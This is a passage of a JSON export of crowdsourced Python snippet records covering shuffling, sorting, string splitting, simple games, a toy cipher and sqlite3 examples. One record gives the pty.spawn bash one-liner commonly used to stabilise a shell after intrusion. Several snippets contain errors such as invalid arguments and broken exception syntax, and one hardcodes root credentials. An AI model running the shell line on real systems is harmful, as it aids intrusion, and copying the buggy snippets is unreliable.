    "description": "import random number_list = [7, 14, 21, 28, 35, 42, 49, 56, 63, 70] print (\"Original list : \",  number_list)  random.shuffle(number_list) #shuffle method print (\"List after shuffle  : \",  number_list)\nimport random  random.shuffle(list)\nimport random  number_list = [7, 14, 21, 28, 35, 42, 49, 56, 63, 70] print(\"Original list:\", number_list)  random.shuffle(number_list) print(\"List after first shuffle:\", number_list)  random.shuffle(number_list) print(\"List after second shuffle:\", number_list)\nimport random l = list(range(5)) print(l) # [0, 1, 2, 3, 4]  lr = random.sample(l, len(l)) print(lr) # [3, 2, 4, 1, 0]  print(l) # [0, 1, 2, 3, 4] \n",
    "reg_date": "2021-10-12T11:34:11.000Z"
  },
  {
    "id": 3872,
    "keyword": null,
    "link": null,
    "title": " python shuffle two lists in the same way",
    "description": "# Example usage using random: import random # Say you want to shuffle (randomly reorder) the following lists in the # same way (e.g. because there's an association between the elements that # you want to maintain): your_list_1 = ['the', 'original', 'order'] your_list_2 = [1, 2, 3]  # Steps to shuffle: joined_lists = list(zip(your_list_1, your_list_2)) random.shuffle(joined_lists) # Shuffle \"joined_lists\" in place your_list_1, your_list_2 = zip(*joined_lists) # Undo joining print(your_list_1) print(your_list_2) --> ('the', 'order', 'original') # Both lists shuffled in the same way --> (1, 3, 2) # Use list(your_list_2) to convert to list\n",
    "reg_date": "2021-10-12T11:34:11.000Z"
  },
  {
    "id": 3873,
    "keyword": null,
    "link": null,
    "title": " python sigmoid function",
    "description": "def sigmoid(x):     return 1 / (1 + numpy.exp(-x))\n  return 1 / (1 + math.exp(-x))\n",
    "reg_date": "2021-10-12T11:34:11.000Z"
  },
  {
    "id": 3874,
    "keyword": null,
    "link": null,
    "title": " python simple columnar cipher",
    "description": "def columnar_encrypt(text, key):     m = { i : [] for i in key }     cols = [list(text[j:j+len(key)]) for j in range(0, len(text), len(key))]     if len(cols[-1]) < len(key):         while len(cols[-1]) != len(key):             cols[-1].append(' ')     i = 0     for k in m.keys():         if i < len(key):             for j in cols:                 m[k] += j[i]             i += 1     s = {k : m[k] for k in sorted(m)}     cipher = ''     for i in s.keys():         for x in s[i]:             cipher += x     print(m)     return cipher  def columnar_decrypt(cipher, key):     if len(cipher) < len(key):         key = key[:len(cipher)]     n = len(cipher) // len(key)     s = { k : [] for k in sorted(key) }     cols = [cipher[j:j+n] for j in range(0, len(cipher), n)]         i = 0     for k in s.keys():         if i < len(key):             s[k] = list(cols[i])             i += 1     m = {}       for k in key:         m[k] = s[k]     o = m     plain = ''     import pandas as pd     m = pd.DataFrame(m)     for i in m.itertuples():         for j in i[1:]:             plain += j     print(s, '\\n')     return plain.strip()\ndef columnar_encrypt():     plain = input(\"Enter the plain text: \").replace(' ', '')     key = list(input(\"Enter the plain text: \").lower())     rowSize = len((key))     m = [(list(plain[i: i + rowSize])) for i in range(0, len(plain), rowSize)]     for i in m:         if len(i) != rowSize:             while len(i) != rowSize:                 i.append('')         print(i)     key_sort = []     for i in sorted(key):         key_sort.append(key.index(i))         key[key.index(i)] = ''     print(key_sort)     cipher = []     for i in key_sort:         for j in range(len(m)):             if m[j][i] is not '':                    cipher.append(m[j][i])     return 'Cipher Text: Read if you can: {0}'.format(''.join(cipher))\n",
    "reg_date": "2021-10-12T11:34:12.000Z"
  },
  {
    "id": 3875,
    "keyword": null,
    "link": null,
    "title": " python simple server",
    "description": "python3 -m http.server 8000\n# If Python version is 3.X python3 -m http.server  # If Python version is 2.X python -m SimpleHTTPServer\npython3 -m http.server port\npython -m http.server 8000 --bind 127.0.0.1 \npython -m SimpleHTTPServer port\nOn Ubuntu go to Commands and hit these two commands-> cd folderName python3 -m http.server 8080\n",
    "reg_date": "2021-10-12T11:34:12.000Z"
  },
  {
    "id": 3876,
    "keyword": null,
    "link": null,
    "title": " python sleep",
    "description": "from random import randint from time import sleep  sleep(randint(10,100))\nimport time  print(\"Printed immediately.\") time.sleep(2.4) print(\"Printed after 2.4 seconds.\")\nimport time  print(\"Print now\") time.sleep(4.2) print(\"Printing after 4.2 seconds\")\n#!/usr/bin/python3 import time  print (\"Start : %s\" % time.ctime()) time.sleep( 5 ) print (\"End : %s\" % time.ctime())  # Start : Mon Feb 15 12:08:42 2016 # End : Mon Feb 15 12:08:47 2016\nimport time #stops the program for x seconds time.sleep(x)\nimport time  start = time.time() print(\"sleeping...\") time.sleep(0.5) print(\"woke up...\") elapsed_time = time.time() - start  print(\"elapsed time:\", elapsed_time * 1000, \"milliseconds\")\n",
    "reg_date": "2021-10-12T11:34:12.000Z"
  },
  {
    "id": 3877,
    "keyword": null,
    "link": null,
    "title": " python sleep random",
    "description": "from random import randint from time import sleep  sleep(randint(10,100))\n",
    "reg_date": "2021-10-12T11:34:12.000Z"
  },
  {
    "id": 3878,
    "keyword": null,
    "link": null,
    "title": " python slow print",
    "description": "import sys import time def slowprint(s): \tfor c in s + '\\n': \t\tsys.stdout.write(c) \t\tsys.stdout.flush() \t\ttime.sleep(1./10) slowprint(\"this this writen slowly in my terminal\")\ndef slowPrint(string):     for char in range(len(string)):         print(string[char], end=\"\")         #time.sleep(x) can be used for a longer wait but is not needed...         #for a noticable reduction in output speed     print(\"\") \n#pip install slowprint from slowprint.slowprint import * slowprint(\"Hello World, this is slow print\", 0.1) #slowprint(<Text to print>, <speed in seconds>)\n#pip install slowprint from slowprint.slowprint import * slowprint(\"Hello World, this is slow print\", 0.1)\n",
    "reg_date": "2021-10-12T11:34:12.000Z"
  },
  {
    "id": 3879,
    "keyword": null,
    "link": null,
    "title": " python snake code copy and paste",
    "description": "import pygame import time import random   pygame.init()   white = (255, 255, 255) yellow = (255, 255, 102) black = (0, 0, 0) red = (213, 50, 80) green = (0, 255, 0) blue = (50, 153, 213)   dis_width = 600 dis_height = 400   dis = pygame.display.set_mode((dis_width, dis_height)) pygame.display.set_caption('Snake Game by Edureka')   clock = pygame.time.Clock()   snake_block = 10 snake_speed = 15   font_style = pygame.font.SysFont(\"bahnschrift\", 25) score_font = pygame.font.SysFont(\"comicsansms\", 35)     def Your_score(score):     value = score_font.render(\"Your Score: \" + str(score), True, yellow)     dis.blit(value, [0, 0])       def our_snake(snake_block, snake_list):     for x in snake_list:         pygame.draw.rect(dis, black, [x[0], x[1], snake_block, snake_block])     def message(msg, color):     mesg = font_style.render(msg, True, color)     dis.blit(mesg, [dis_width / 6, dis_height / 3])     def gameLoop():     game_over = False     game_close = False       x1 = dis_width / 2     y1 = dis_height / 2       x1_change = 0     y1_change = 0       snake_List = []     Length_of_snake = 1       foodx = round(random.randrange(0, dis_width - snake_block) / 10.0) * 10.0     foody = round(random.randrange(0, dis_height - snake_block) / 10.0) * 10.0       while not game_over:           while game_close == True:             dis.fill(blue)             message(\"You Lost! Press C-Play Again or Q-Quit\", red)             Your_score(Length_of_snake - 1)             pygame.display.update()               for event in pygame.event.get():                 if event.type == pygame.KEYDOWN:                     if event.key == pygame.K_q:                         game_over = True                         game_close = False                     if event.key == pygame.K_c:                         gameLoop()           for event in pygame.event.get():             if event.type == pygame.QUIT:                 game_over = True             if event.type == pygame.KEYDOWN:                 if event.key == pygame.K_LEFT:                     x1_change = -snake_block                     y1_change = 0                 elif event.key == pygame.K_RIGHT:                     x1_change = snake_block                     y1_change = 0                 elif event.key == pygame.K_UP:                     y1_change = -snake_block                     x1_change = 0                 elif event.key == pygame.K_DOWN:                     y1_change = snake_block                     x1_change = 0           if x1 >= dis_width or x1 < 0 or y1 >= dis_height or y1 < 0:             game_close = True         x1 += x1_change         y1 += y1_change         dis.fill(blue)         pygame.draw.rect(dis, green, [foodx, foody, snake_block, snake_block])         snake_Head = []         snake_Head.append(x1)         snake_Head.append(y1)         snake_List.append(snake_Head)         if len(snake_List) > Length_of_snake:             del snake_List[0]           for x in snake_List[:-1]:             if x == snake_Head:                 game_close = True           our_snake(snake_block, snake_List)         Your_score(Length_of_snake - 1)           pygame.display.update()           if x1 == foodx and y1 == foody:             foodx = round(random.randrange(0, dis_width - snake_block) / 10.0) * 10.0             foody = round(random.randrange(0, dis_height - snake_block) / 10.0) * 10.0             Length_of_snake += 1           clock.tick(snake_speed)       pygame.quit()     quit()     gameLoop() \n",
    "reg_date": "2021-10-12T11:34:12.000Z"
  },
  {
    "id": 3880,
    "keyword": null,
    "link": null,
    "title": " python snake game code",
    "description": "#this code has asumed that you have intsalled pygame,time,random> import pygame import time import random   pygame.init()   white = (255, 255, 255) yellow = (255, 255, 102) black = (0, 0, 0) red = (213, 50, 80) green = (0, 255, 0) blue = (50, 153, 213)   dis_width = 600 dis_height = 400   dis = pygame.display.set_mode((dis_width, dis_height)) pygame.display.set_caption('Snake Game by Edureka')   clock = pygame.time.Clock()   snake_block = 10 snake_speed = 15   font_style = pygame.font.SysFont(\"bahnschrift\", 25) score_font = pygame.font.SysFont(\"comicsansms\", 35)     def Your_score(score):     value = score_font.render(\"Your Score: \" + str(score), True, yellow)     dis.blit(value, [0, 0])       def our_snake(snake_block, snake_list):     for x in snake_list:         pygame.draw.rect(dis, black, [x[0], x[1], snake_block, snake_block])     def message(msg, color):     mesg = font_style.render(msg, True, color)     dis.blit(mesg, [dis_width / 6, dis_height / 3])     def gameLoop():     game_over = False     game_close = False       x1 = dis_width / 2     y1 = dis_height / 2       x1_change = 0     y1_change = 0       snake_List = []     Length_of_snake = 1       foodx = round(random.randrange(0, dis_width - snake_block) / 10.0) * 10.0     foody = round(random.randrange(0, dis_height - snake_block) / 10.0) * 10.0       while not game_over:           while game_close == True:             dis.fill(blue)             message(\"You Lost! Press C-Play Again or Q-Quit\", red)             Your_score(Length_of_snake - 1)             pygame.display.update()               for event in pygame.event.get():                 if event.type == pygame.KEYDOWN:                     if event.key == pygame.K_q:                         game_over = True                         game_close = False                     if event.key == pygame.K_c:                         gameLoop()           for event in pygame.event.get():             if event.type == pygame.QUIT:                 game_over = True             if event.type == pygame.KEYDOWN:                 if event.key == pygame.K_LEFT:                     x1_change = -snake_block                     y1_change = 0                 elif event.key == pygame.K_RIGHT:                     x1_change = snake_block                     y1_change = 0                 elif event.key == pygame.K_UP:                     y1_change = -snake_block                     x1_change = 0                 elif event.key == pygame.K_DOWN:                     y1_change = snake_block                     x1_change = 0           if x1 >= dis_width or x1 < 0 or y1 >= dis_height or y1 < 0:             game_close = True         x1 += x1_change         y1 += y1_change         dis.fill(blue)         pygame.draw.rect(dis, green, [foodx, foody, snake_block, snake_block])         snake_Head = []         snake_Head.append(x1)         snake_Head.append(y1)         snake_List.append(snake_Head)         if len(snake_List) > Length_of_snake:             del snake_List[0]           for x in snake_List[:-1]:             if x == snake_Head:                 game_close = True           our_snake(snake_block, snake_List)         Your_score(Length_of_snake - 1)           pygame.display.update()           if x1 == foodx and y1 == foody:             foodx = round(random.randrange(0, dis_width - snake_block) / 10.0) * 10.0             foody = round(random.randrange(0, dis_height - snake_block) / 10.0) * 10.0             Length_of_snake += 1           clock.tick(snake_speed)       pygame.quit()     quit()     gameLoop()\nimport turtle import random  WIDTH = 500 HEIGHT = 500 FOOD_SIZE = 10 DELAY = 100  # milliseconds  offsets = {     \"up\": (0, 20),     \"down\": (0, -20),     \"left\": (-20, 0),     \"right\": (20, 0) }  def reset():     global snake, snake_direction, food_pos, pen     snake = [[0, 0], [0, 20], [0, 40], [0, 60], [0, 80]]     snake_direction = \"up\"     food_pos = get_random_food_pos()     food.goto(food_pos)     # screen.update() Only needed if we are fussed about drawing food before next call to `draw_snake()`.     move_snake()  def move_snake():     global snake_direction      #  Next position for head of snake.     new_head = snake[-1].copy()     new_head[0] = snake[-1][0] + offsets[snake_direction][0]     new_head[1] = snake[-1][1] + offsets[snake_direction][1]      # Check self-collision     if new_head in snake[:-1]:  # Or collision with walls?         reset()     else:         # No self-collision so we can continue moving the snake.         snake.append(new_head)          # Check food collision         if not food_collision():             snake.pop(0)  # Keep the snake the same length unless fed.          #  Allow screen wrapping         if snake[-1][0] > WIDTH / 2:             snake[-1][0] -= WIDTH         elif snake[-1][0] < - WIDTH / 2:             snake[-1][0] += WIDTH         elif snake[-1][1] > HEIGHT / 2:             snake[-1][1] -= HEIGHT         elif snake[-1][1] < -HEIGHT / 2:             snake[-1][1] += HEIGHT          # Clear previous snake stamps         pen.clearstamps()          # Draw snake         for segment in snake:             pen.goto(segment[0], segment[1])             pen.stamp()          # Refresh screen         screen.update()          # Rinse and repeat         turtle.ontimer(move_snake, DELAY)  def food_collision():     global food_pos     if get_distance(snake[-1], food_pos) < 20:         food_pos = get_random_food_pos()         food.goto(food_pos)         return True     return False  def get_random_food_pos():     x = random.randint(- WIDTH / 2 + FOOD_SIZE, WIDTH / 2 - FOOD_SIZE)     y = random.randint(- HEIGHT / 2 + FOOD_SIZE, HEIGHT / 2 - FOOD_SIZE)     return (x, y)  def get_distance(pos1, pos2):     x1, y1 = pos1     x2, y2 = pos2     distance = ((y2 - y1) ** 2 + (x2 - x1) ** 2) ** 0.5     return distance  def go_up():     global snake_direction     if snake_direction != \"down\":         snake_direction = \"up\"  def go_right():     global snake_direction     if snake_direction != \"left\":         snake_direction = \"right\"  def go_down():     global snake_direction     if snake_direction != \"up\":         snake_direction = \"down\"  def go_left():     global snake_direction     if snake_direction != \"right\":         snake_direction = \"left\"  # Screen screen = turtle.Screen() screen.setup(WIDTH, HEIGHT) screen.title(\"Snake master play and have fanda\") screen.bgcolor(\"yellow\") screen.setup(500, 500) screen.tracer(0)  # Pen pen = turtle.Turtle(\"square\") pen.penup()  # Food food = turtle.Turtle() food.shape(\"square\") food.color(\"red\") food.shapesize(FOOD_SIZE / 20)  # Default size of turtle \"square\" shape is 20. food.penup()  # Event handlers screen.listen() screen.onkey(go_up, \"Up\") screen.onkey(go_right, \"Right\") screen.onkey(go_down, \"Down\") screen.onkey(go_left, \"Left\")  # Let's go reset() turtle.done()\n",
    "reg_date": "2021-10-12T11:34:12.000Z"
  },
  {
    "id": 3881,
    "keyword": null,
    "link": null,
    "title": " python sort a dictionary by values",
    "description": "s = {1: 1, 7: 2, 4: 2, 3: 1, 8: 1} k = dict(sorted(s.items(),key=lambda x:x[0],reverse = True)) print(k)\nx = {1: 2, 3: 4, 4: 3, 2: 1, 0: 0}  sort_by_key = dict(sorted(x.items(),key=lambda item:item[0])) sort_by_value = dict(sorted(x.items(), key=lambda item: item[1]))  print(\"sort_by_key:\", sort_by_key) print(\"sort_by_value:\", sort_by_value)  # sort_by_key: {0: 0, 1: 2, 2: 1, 3: 4, 4: 3} # sort_by_value: {0: 0, 2: 1, 1: 2, 4: 3, 3: 4}\nimport operator x = {1: 2, 3: 4, 4: 3, 2: 1, 0: 0} sorted_x = sorted(x.items(), key=operator.itemgetter(1))   # Sort by key import operator x = {1: 2, 3: 4, 4: 3, 2: 1, 0: 0} sorted_x = sorted(x.items(), key=operator.itemgetter(0)) \n>>> d = {\"aa\": 3, \"bb\": 4, \"cc\": 2, \"dd\": 1} >>> for k in sorted(d, key=d.get, reverse=True): ...     k, d[k] ... ('bb', 4) ('aa', 3) ('cc', 2) ('dd', 1)\n",
    "reg_date": "2021-10-12T11:34:12.000Z"
  },
  {
    "id": 3882,
    "keyword": null,
    "link": null,
    "title": " python sort dictionary alphabetically by key",
    "description": "sortednames=sorted(dictUsers.keys(), key=lambda x:x.lower())\n",
    "reg_date": "2021-10-12T11:34:12.000Z"
  },
  {
    "id": 3883,
    "keyword": null,
    "link": null,
    "title": " python sort dictionary by value descending",
    "description": "Python Code: import operator d = {1: 2, 3: 4, 4: 3, 2: 1, 0: 0} print('Original dictionary : ',d) sorted_d = dict(sorted(d.items(), key=operator.itemgetter(1))) print('Dictionary in ascending order by value : ',sorted_d) sorted_d = dict(sorted(d.items(), key=operator.itemgetter(1),reverse=True)) print('Dictionary in descending order by value : ',sorted_d)  Sample Output: Original dictionary :  {1: 2, 3: 4, 4: 3, 2: 1, 0: 0} Dictionary in ascending order by value :  {0: 0, 2: 1, 1: 2, 4: 3, 3: 4} Dictionary in descending order by value :  {3: 4, 4: 3, 1: 2, 2: 1, 0: 0}\n1. new_list = sorted(old_list, key=lambda k: k['key'], reverse=True) /*use reverse=False for ascending order*/\n",
    "reg_date": "2021-10-12T11:34:12.000Z"
  },
  {
    "id": 3884,
    "keyword": null,
    "link": null,
    "title": " python sort list by last element",
    "description": "output = sorted(my_list, key=lambda x: x[-1])\n",
    "reg_date": "2021-10-12T11:34:13.000Z"
  },
  {
    "id": 3885,
    "keyword": null,
    "link": null,
    "title": " python sort list in reverse",
    "description": "#1 Changes list list.sort(reverse=True) #2 Returns sorted list sorted(list, reverse=True)\nlanguages = ['C++', 'Python', 'Scratch'] #Method1: languages.reverse() print(languages) #Method2: lang = languages[::-1] print(lang)\nsorted(list, key=..., reverse=...)\n",
    "reg_date": "2021-10-12T11:34:13.000Z"
  },
  {
    "id": 3886,
    "keyword": null,
    "link": null,
    "title": " python sort list in reverse order",
    "description": "# there are two types of lists # returns new list sorted(list_name, reverse=True)  # changes list in place list_name.sort(reverse=True)\n#1 Changes list list.sort(reverse=True) #2 Returns sorted list sorted(list, reverse=True)\n# defning A as a list A.sort(reverse = True)\n>>> names = ['Harry', 'Suzy', 'Al', 'Mark'] >>> sorted(names) ['Al', 'Harry', 'Mark', 'Suzy'] >>> sorted(names, reverse=True) ['Suzy', 'Mark', 'Harry', 'Al'] \n",
    "reg_date": "2021-10-12T11:34:13.000Z"
  },
  {
    "id": 3887,
    "keyword": null,
    "link": null,
    "title": " python sort list of integers",
    "description": "numbers = [1, 5, -2, 4] # Sort in ascending order, applied in place numbers.sort() # Sort in descending order, applied in place numbers.sort(descending=True)\nmy_list = [9, 3, 1, 5, 88, 22, 99]  # sort in decreasing order my_list = sorted(my_list, reverse=True)  print(my_list)  # sort in increasing order my_list = sorted(my_list, reverse=False)  print(my_list)  # another way to sort using built-in methods my_list.sort(reverse=True)   print(my_list)  # sort again using slice indexes print(my_list[::-1])  # Output # [99, 88, 22, 9, 5, 3, 1] # [1, 3, 5, 9, 22, 88, 99] # [99, 88, 22, 9, 5, 3, 1] # [1, 3, 5, 9, 22, 88, 99]\nnums = [48, 35, 32, 5, 5, 16, 5, 16, 28, 29] # Makes a list of numbers  sortedNums = sorted(nums, key=int) # Sorts the numbers and saves it as a variable print(sortedNums) # Prints the variable\n# sort() will change the original list into a sorted list vowels = ['e', 'a', 'u', 'o', 'i'] vowels.sort() # Output: # ['a', 'e', 'i', 'o', 'u']  # sorted() will sort the list and return it while keeping the original sortedVowels = sorted(vowels) # Output: # ['a', 'e', 'i', 'o', 'u']\nnumbers = [1, 5, -2, 4] numbers.sort() print(numbers)\n",
    "reg_date": "2021-10-12T11:34:13.000Z"
  },
  {
    "id": 3888,
    "keyword": null,
    "link": null,
    "title": " python sort list of strings numerically",
    "description": "# Example usage: your_list = ['cmd1','cmd10', 'cmd111', 'cmd50', 'cmd99'] your_list.sort(key=lambda x: int(x[3:])) print(your_list) --> ['cmd1', 'cmd10', 'cmd50', 'cmd99', 'cmd111']\n",
    "reg_date": "2021-10-12T11:34:13.000Z"
  },
  {
    "id": 3889,
    "keyword": null,
    "link": null,
    "title": " python space invaders code",
    "description": "# python space invaders (made by yasin) import pygame   class Game:     screen = None     aliens = []     rockets = []     lost = False      def __init__(self, width, height):         pygame.init()         self.width = width         self.height = height         self.screen = pygame.display.set_mode((width, height))         self.clock = pygame.time.Clock()         done = False          hero = Hero(self, width / 2, height - 20)         generator = Generator(self)         rocket = None          while not done:             if len(self.aliens) == 0:                 self.displayText(\"VICTORY ACHIEVED\")              pressed = pygame.key.get_pressed()             if pressed[pygame.K_LEFT]:  # sipka doleva                 hero.x -= 2 if hero.x > 20 else 0  # leva hranice plochy             elif pressed[pygame.K_RIGHT]:  # sipka doprava                 hero.x += 2 if hero.x < width - 20 else 0  # prava hranice              for event in pygame.event.get():                 if event.type == pygame.QUIT:                     done = True                 if event.type == pygame.KEYDOWN and event.key == pygame.K_SPACE and not self.lost:                     self.rockets.append(Rocket(self, hero.x, hero.y))              pygame.display.flip()             self.clock.tick(60)             self.screen.fill((0, 0, 0))              for alien in self.aliens:                 alien.draw()                 alien.checkCollision(self)                 if (alien.y > height):                     self.lost = True                     self.displayText(\"YOU DIED\")              for rocket in self.rockets:                 rocket.draw()              if not self.lost: hero.draw()      def displayText(self, text):         pygame.font.init()         font = pygame.font.SysFont('Arial', 50)         textsurface = font.render(text, False, (44, 0, 62))         self.screen.blit(textsurface, (110, 160))   class Alien:     def __init__(self, game, x, y):         self.x = x         self.game = game         self.y = y         self.size = 30      def draw(self):         pygame.draw.rect(self.game.screen,  # renderovac&iacute; plocha                          (81, 43, 88),  # barva objektu                          pygame.Rect(self.x, self.y, self.size, self.size))         self.y += 0.05      def checkCollision(self, game):         for rocket in game.rockets:             if (rocket.x < self.x + self.size and                     rocket.x > self.x - self.size and                     rocket.y < self.y + self.size and                     rocket.y > self.y - self.size):                 game.rockets.remove(rocket)                 game.aliens.remove(self)   class Hero:     def __init__(self, game, x, y):         self.x = x         self.game = game         self.y = y      def draw(self):         pygame.draw.rect(self.game.screen,                          (210, 250, 251),                          pygame.Rect(self.x, self.y, 8, 5))   class Generator:     def __init__(self, game):         margin = 30  # mezera od okraju obrazovky         width = 50  # mezera mezi alieny         for x in range(margin, game.width - margin, width):             for y in range(margin, int(game.height / 2), width):                 game.aliens.append(Alien(game, x, y))          # game.aliens.append(Alien(game, 280, 50))   class Rocket:     def __init__(self, game, x, y):         self.x = x         self.y = y         self.game = game      def draw(self):         pygame.draw.rect(self.game.screen,  # renderovac&iacute; plocha                          (254, 52, 110),  # barva objektu                          pygame.Rect(self.x, self.y, 2, 4))         self.y -= 2  # polet&iacute; po hern&iacute; plo&scaron;e nahoru 2px/sn&iacute;mek   if __name__ == '__main__':     game = Game(600, 400)\n",
    "reg_date": "2021-10-12T11:34:13.000Z"
  },
  {
    "id": 3890,
    "keyword": null,
    "link": null,
    "title": " python spawn shell",
    "description": "python -c 'import pty;pty.spawn(\"/bin/bash\")'\n",
    "reg_date": "2021-10-12T11:34:13.000Z"
  },
  {
    "id": 3891,
    "keyword": null,
    "link": null,
    "title": " python split a string of tuples into a list of lists",
    "description": "# Basic syntax: import ast [list(elem) for elem in ast.literal_eval(your_string)]  # Example usage: # Say you want to convert a string like: '(0,0,0), (0,0,1), (1,1,0)' # or like '((0,0,0), (0,0,1), (1,1,0))' # to a list of lists like: [[0, 0, 0], [0, 0, 1], [1, 1, 0]]  # Import the Abstract Syntax Trees package: import ast your_string = '(0,0,0), (0,0,1), (1,1,0)'  # First, convert to tuple of tuples: your_tuple = ast.literal_eval(your_string) print(your_tuple) --> ((0,0,0), (0,0,1), (1,1,0))  # Then, convert to a list of lists with list comprehension: your_list = [list(elem) for elem in your_tuple] print(your_list) --> [[0, 0, 0], [0, 0, 1], [1, 1, 0]]\n",
    "reg_date": "2021-10-12T11:34:13.000Z"
  },
  {
    "id": 3892,
    "keyword": null,
    "link": null,
    "title": " python split by newline",
    "description": "# Using str.splitlines() method, you can split a string by new lines  # Example 1 string = \"Line 1\\nLine 2\\nLine 3\\nLine4\" string = string.splitlines() print(string) # OUTPUT ['Line 1', 'Line 2', 'Line 3', 'Line4']  # Example 2 string = \"\"\"Hello world. My name is bob  I like dogs\"\"\" string = string.splitlines() print(string) # OUTPUT ['Hello world.', 'My name is bob', '', 'I like dogs']  # 2.X Documentation: https://docs.python.org/2/library/stdtypes.html#str.splitlines # 3.X Documentation: https://docs.python.org/3/library/stdtypes.html#str.splitlines\nvar = myString.splitlines()\n",
    "reg_date": "2021-10-12T11:34:13.000Z"
  },
  {
    "id": 3893,
    "keyword": null,
    "link": null,
    "title": " python split first space",
    "description": ">>> s = \"238 NEO Sports\" >>> s.split(\" \", 1) ['238', 'NEO Sports'] \n",
    "reg_date": "2021-10-12T11:34:13.000Z"
  },
  {
    "id": 3894,
    "keyword": null,
    "link": null,
    "title": " python split on first occurrence",
    "description": "str.split([sep[, maxsplit]]) s = \"123mango abcd mango kiwi peach\" s.split(\"mango\", 1) ['123', ' abcd mango kiwi peach'] >>> s.split(\"mango\", 1)[1] ' abcd mango kiwi peach'\n",
    "reg_date": "2021-10-12T11:34:13.000Z"
  },
  {
    "id": 3895,
    "keyword": null,
    "link": null,
    "title": " python split range equally",
    "description": "def chunks(lst, n):     \"\"\"Yield successive n-sized chunks from lst.\"\"\"     for i in range(0, len(lst), n):         yield lst[i:i + n]          list(chunks(range(10, 75), 10))\n[lst[i:i + n] for i in range(0, len(lst), n)]\n",
    "reg_date": "2021-10-12T11:34:14.000Z"
  },
  {
    "id": 3896,
    "keyword": null,
    "link": null,
    "title": " python split sentence into words",
    "description": "sentence = 'Hello world a b c' split_sentence = sentence.split(' ') print(split_sentence)\ndef split(word):     return [char for char in word]   word = \"word\" print(split(word)) #output: [\"w\", \"o\", \"r\", \"d\"] \ntext= \"I am Batman\" splitted_text= text.split()  Print(splitted_text)\n",
    "reg_date": "2021-10-12T11:34:14.000Z"
  },
  {
    "id": 3897,
    "keyword": null,
    "link": null,
    "title": " python split string by tab",
    "description": ">>> import re >>> strs = \"foo\\tbar\\t\\tspam\" >>> re.split(r'\\t+', strs) ['foo', 'bar', 'spam'] \n",
    "reg_date": "2021-10-12T11:34:14.000Z"
  },
  {
    "id": 3898,
    "keyword": null,
    "link": null,
    "title": " python split string in pairs",
    "description": "string = '1234567890' n = 2\t# every 2 characters split_string = [string[i:i+n] for i in range(0, len(string), n)] # split_string = ['12', '34', '56', '78', '90']\n>>> line = '1234567890' >>> n = 2 >>> [line[i:i+n] for i in range(0, len(line), n)] ['12', '34', '56', '78', '90']\n",
    "reg_date": "2021-10-12T11:34:14.000Z"
  },
  {
    "id": 3899,
    "keyword": null,
    "link": null,
    "title": " python sqlite3 database",
    "description": "pip install pysqlite3 \nimport sqlite3  # Create database conn = sqlite3.connect('tablename.db') c = conn.cursor() c.execute('''CREATE TABLE tablename(id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, number REAL)''') conn.commit() conn.close()  # Insert Values conn = sqlite3.connect('tablename.db') c = conn.cursor() c.execute(\"INSERT INTO tablename VALUES (?, ?)\", (name, number)) conn.commit() conn.close()  # Read Values conn = sqlite3.connect('tablename.db') c = conn.cursor()  for row in c.execute('SELECT * FROM tablename'): \tprint(row)  number = [row[2] for row in c.execute('SELECT * FROM tablename')] conn.close()\npip install sqlite\nimport sqlite3 as lite  import sys    try:      con = lite.connect('products.db')      cur = con.cursor()          cur.execute(\"CREATE TABLE drinks(Id INTEGER PRIMARY KEY AUTOINCREMENT, Name TEXT, Price REAL)\")      cur.execute(\"CREATE TABLE fruits(Id INTEGER PRIMARY KEY AUTOINCREMENT, Name TEXT, Price REAL)\")      con.commit()                except e:      if con:          con.rollback()            print(\"Unexpected error %s:\" % e.args[0])      sys.exit(1)  finally:      if con:          con.close()  \n-- SQL examples ---------------------------------------------------------------------------------------------------  -- http://inf-schule-db.informatik.uni-kl.de/SQLterra1.php -------------------------------------------------------- -- https://www.inf-schule.de/information/datenbanksysteme/terra/relationaledb -------------------------------------- CREATE TABLE `land` (   `LNR` varchar(4) NOT NULL,   `Name` varchar(50) NOT NULL,   `Einwohner` decimal(20,2) DEFAULT NULL,   `Flaeche` int(11) DEFAULT NULL,   `Hauptstadt` varchar(30) DEFAULT NULL,   `Kontinent` varchar(15) DEFAULT NULL,   `KontinentFlaeche` int(11) DEFAULT NULL,   `KontinentEinwohner` int(11) NOT NULL ); -- ---------------------------------------------------------------------------------------------------------------- INSERT INTO `land` (`LNR`, `Name`, `Einwohner`, `Flaeche`, `Hauptstadt`, `Kontinent`, `KontinentFlaeche`, `KontinentEinwohner`) VALUES ('A', '&Ouml;sterreich', '8.51', 83879, 'Wien', 'Europa', 10, 733), ('AC', 'Antigua und Barbuda', '0.09', 443, 'Saint John s', 'Nordamerika', 24, 523), ('AF', 'Afghanistan', '33.40', 652230, 'Kabul', 'Asien', 44, 4010), ('AG', 'Algerien', '37.40', 2381741, 'Algiers', 'Afrika', 30, 944), ('AL', 'Albanien', '2.80', 28748, 'Tirana', 'Europa', 10, 733); -- ---------------------------------------------------------------------------------------------------------------- CREATE TABLE `ort` (   `Name` varchar(30) DEFAULT NULL,   `Land` varchar(50) NOT NULL,   `Einwohner` int(11) DEFAULT NULL,   `Laenge` decimal(10,4) DEFAULT NULL,   `Breite` decimal(10,4) DEFAULT NULL ); -- ---------------------------------------------------------------------------------------------------------------- INSERT INTO `ort` (`Name`, `Land`, `Einwohner`, `Laenge`, `Breite`) VALUES ('Kabul', 'Afghanistan', 1400000, '69.0000', '34.0000'), ('Kandahar', 'Afghanistan', 323900, '65.0000', '31.0000'), ('Masar-e Scharif', 'Afghanistan', 250000, '67.0000', '36.0000'), ('Abnub', '&Auml;gypten', 70791, '31.1500', '27.2700'), ('Abo el Matamer', '&Auml;gypten', 47432, '30.1800', '30.9200'); -- ---------------------------------------------------------------------------------------------------------------- SELECT name, einwohner, hauptstadt   FROM land ORDER BY einwohner DESC -- ---------------------------------------------------------------------------------------------------------------- SELECT name   FROM land WHERE kontinent='europa' -- ---------------------------------------------------------------------------------------------------------------- SELECT name, einwohner   FROM land WHERE einwohner>=10 and einwohner<=100 ORDER BY einwohner DESC -- ---------------------------------------------------------------------------------------------------------------- SELECT name, hauptstadt   FROM land WHERE name LIKE '%Arm%' or name LIKE '%Bein%' -- ---------------------------------------------------------------------------------------------------------------- SELECT name, laenge   FROM ort WHERE land='Deutschland' and laenge<7.768 -- ---------------------------------------------------------------------------------------------------------------- SELECT name, hauptstadt, kontinent   FROM land WHERE kontinent IN ('Asien','Australien')  -- https://www.youtube.com/watch?v=91iNR0eG8kE -------------------------------------------------------------------- import mysql.connector db = mysql.connector.connect( \thost=\"localhost\", \tuser=\"root\", \tpasswd=\"root\", 